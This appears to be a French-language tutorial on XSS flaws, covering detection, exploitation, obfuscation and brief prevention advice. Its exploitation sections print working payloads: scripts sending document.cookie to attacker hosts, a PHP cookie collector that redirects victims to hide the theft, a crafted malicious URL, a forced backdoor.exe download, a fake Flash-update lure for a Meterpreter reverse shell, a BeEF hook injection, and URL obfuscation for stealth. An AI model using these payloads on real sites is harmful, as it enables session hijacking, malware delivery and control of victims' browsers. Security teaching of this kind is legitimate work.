# Failles web - XSS

## Description
La faille XSS ou Xross-Site Scripting est une faille par injection (de code) et est parmi les plus répandues sur le web. Il existe deux grandes familles:
* Reflective (non persistante) : pas d'écriture dans la base de données, c'est par exemple l'affichage d'une popup
* Stored (persistante) : le code injecté est enregistré (fichiers, bdd...) et sera exécuté ultérieurement par l'utilisateur de ces données (ex livre d'or, commentaires à un admin ...)

Il est difficile de s'en prémunir puisque le navigateur devrait alors désactiver des fonctions importantes pour son fonctionnement nominal.

## Détection
Pour détecter une faille XSS, il faut tester toutes les entrées utilisateurs en injectant un caractère en fonction du langage, par exemple:
* HTML, XML : `& " ' < >`
* JSON : `& " ' < > : , [ ] { }`

Il est également possible d'injecter directement du code interprétable HTML, JS ou CSS:
* JS :  `<script type=’text/javascript’> alert(‘Hello’) ; </script>`
* CSS : `<style type="text/css"> body { background-color : blue ; background-image : none ; } </style>`
* HTML : `<b>Hello</b>`
* HTML+CSS : `<b style=”text-decoration:blink ;”> Hello </b>` 

Les entrées utilisateurs sont :
* les paramètres de la requêtes GET ou POST
* les champs de formulaires
* un cookie (si il est url encodé)
* les sources de données (fichiers, BDD, flux ...)

## Intention
Les failles XSS permettent de :
* Voler des cookies : `<script>document.location="http://domain.com/get.php?v=" + document.cookie;</script>`
* Rediriger : `<script type="text/javascript">window.location.replace("http://www.google.fr");</script>`
* Deface : `<script type="text/javascript">msg = "<p style=‘text-decoration:blink;color :#F00 ;’> Vous êtes victime d’une attaque XSS ! </p>" ;document.write(msg) ;</script>`
* Forcer un téléchargement : `<script>var link =document.createElement('a');link.href='http://domain.com/backdoor.exe';link.download='';document.body.appendChild(link);link.click();</script>`

Pour trouver de nombreux autres exemples : 
* http://html5sec.org/#html5
* https://www.xss-payloads.com/payloads-list.html?c#category=capture

## Exploitation

### Mise en place complet d'un vol de cookie
Pour le vol de cookie, il faut mettre en place un script capable de récupérer le cookie. Un code PHP très simple qui va enregistré le cookie dans un fichier texte:

    // get.php
    <?php
        $cookie = $_GET['v'] . "\n";
        file_put_contents("cookies.txt", $cookie, FILE_APPEND | LOCK_EX);
    ?>

Pour aller plus loin, on peut également prévoir de rediriger l'utilisateur en fin de script pour qu'il ne se doute de rien:

    <?php 
        if(isset($_GET['c']) && is_string($_GET['c']) && !empty($_GET['c'])) {
 
            $referer = $_SERVER['HTTP_REFERER'];
            $date = date('d-m-Y \à H\hi');
            $data = "From :   $referer\r\nDate :   $date\r\nCookie : ".htmlentities($_GET['c'])."\r\n------------------------------\r\n";
    
            $handle = fopen('cookies.txt','a');
            fwrite($handle, $data);
            fclose($handle);   
    }
    ?>
    <script language="javascript" type="text/javascript">
	    window.location.replace("http://www.diversion.com");
    </script>

### Tout mettre dans une URL
Il est également possible de mettre le vol de cookie dans une URL sur laquelle l'utilisateur n'aura plus qu'à cliquer:

        http://victime.com/vulnerable.php?variable=%3Cscript%3Ewindow.location.replace(%22http://attaquant.com/get.php?c=%22%2Bdocument.cookie.toString());%3C/script%3E

Pour être plus discret, l'URL peut être raccourcie via tinyurl en bit.ly.


### Installation d'une backdoor
Dans le cas d'un site de gallerie d'images vulnérable à XSS sur lequel on pourrait uploader nos images et les commenter:

* Avec le SET (social engineering tool) on créé un windows reverser meterpreter que l'on va faire passer pour une mise à jour flash
* On rend l'exe disponible sur une URL par exemple `http://192.168.1.104/update_flash.exe`
* on charge une image sur le site vulnérable ressemblant à une image d'erreur type "plugin manquant"
* on va charger dans le commentaire, qui représente la faille:
`padding: 10px;' /><br /><br /><a href='http://192.168.1.104/flash_update.exe'><img src='http://192.168.1.104/flash.png' /></a><p alt='`

Quand la victime va cliquer elle va connecter un meterpreter à la machine de l'attaquant.

### BeEF - gestion des zombies
Beef est un framework qui va nous permettre de gérer un ensemble de machine contaminée par XSS. Pour cela il faut injecter:

    <script src="http://attaquant.com:3000/hook.js"></script>
A partir de là, la cible est connecté à BeEF et il possible d'exécuter les payloads BeEF : keylogger, affichage de la caméra ...

https://www.youtube.com/watch?v=G38Ltd1iYB4&list=WL&index=70

### Obfuscation
Pour être plus discret, il est important de ne pas afficher certaines information. il est possible pour cela d'utiliser des techniques d'obfuscation.
En Javascript, on peut coder l'adresse du serveur par exemple, caractère par caractère séparé par des virgules. Ce format permettra de passer le résultat directement à la fonction `String.fromCharCode(str)` pour le décodage. Le codage se fait comme suit:

    var str = "http://www.attaquant.com/get.php?cookie=" ;
    var charCode = "" ;
    for (var i = 0 ; i < str.length ; ++i)
    <em>var c = str.charCodeAt(i) ;
    charCode += (0 != i ? ", " : "") + c ;
    </em>console.log(charCode) ;

La chaîne peut aussi être codé en hexadécimal `"\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77...` (`http://www...`).

Enfin pour simplifier les choses des outils existent:
Obfuscation

    http://javascriptobfuscator.com/
Déobfuscation:

    https://addons.mozilla.org/en-US/firefox/addon/javascript-deobfuscator/

Pour aller plus loins dans l'obfuscation il y'a les [XSS polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot) qui permettent de gagner du temps en exploitant plusieurs contexte d'un coup.

### XSS Blind
Ces failles ne sont pas visibles par l'utilisateur ce qui complique l'exploitation. On les retrouve par exemple dans un champs `nous contacter` a destination d'un administrateur. Nous ne maitrisons pas quand l'admin l'ouvrira et pas forcément les points finaux exploitables. Pour autant cette attaque permet d'accéder à de nombreuses fonctionnalités de l'administrateur.

Pour aider, [XSS Hunter](https://xsshunter.com) va capturer l'écran de l'utilisateur lorsque celui-ci ouvre le payload puis alerte l'attaquand qu'il peut consulter la capture.

### DOM Based XSS
Le DOM (Document Object Model) représente les propriétés HTML. Le navigateur passe par un interpreteur qui trnasforme le code HTML en un modèle qui est le DOM.

La faille XSS DOM Based se passe côté client seulement, ce n'est ni une stored ni une reflected XSS. C'est l'injection de code dans le DOM qui sera lu par le navigateur côté client.

Concrètement cette faille se trouve dans le cas où le code JS client va utiliser un paramètre de l'URL pour écrire du HTML sur sa page et que cette information n'est pas encodée sous forme d'entité HTML.

## Prévention
Pour se prémunir il existe un plugin firefox [XSS-Me](http://labs.securitycompass.com/exploit-me/).

Passer par un langage intermédiaire est un autre moyen de filtrer l'interprétation du code.

Avec PHP il est possible d'utiliser des fonctions:

    preg_replace, str_replace sur <script>

Facilement contournable avec `<scr<script>ipt>`

Il faut plutôt utiliser les fonctions permettant de convertir les caractères en entité HTML:
* `strip_tags()` : supprime tous les tags HTML non souhaités
* `htmlspecialchars()`: convertit les caractères `&  ‘ " < >`
* `htmlentities()` : convertit tous les caractères

Un autre moyen est de passer par un WAF : Web Application Firewall. Il existe un module [mod_security](http://www.modsecurity.org/download/) disponible pour les serveurs les plus connus : Apache, Nginx et IIS.

Dernier moyen, une directive dans le header de la requête sous HTML5. Pour l'activer:

    X-XSS-Protection : 1 ; mode=block
Pour le désactiver:

    X-XSS-Protection : 0


## Liens

https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
https://openclassrooms.com/fr/courses/2091901-protegez-vous-efficacement-contre-les-failles-web/2680167-la-faille-xss
http://xaviermichel.github.io/tutoriel/2011/09/05/Faille-XSS-ou-comment-effectuer-un-vol-de-cookies
https://beta.hackndo.com/attaque-xss/
https://weekly-geekly-es.github.io/articles/fr450780/index.html
https://github.com/foospidy/payloads/tree/master/other/xss
https://www.owaso.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://bit.ly/2qvnLEq
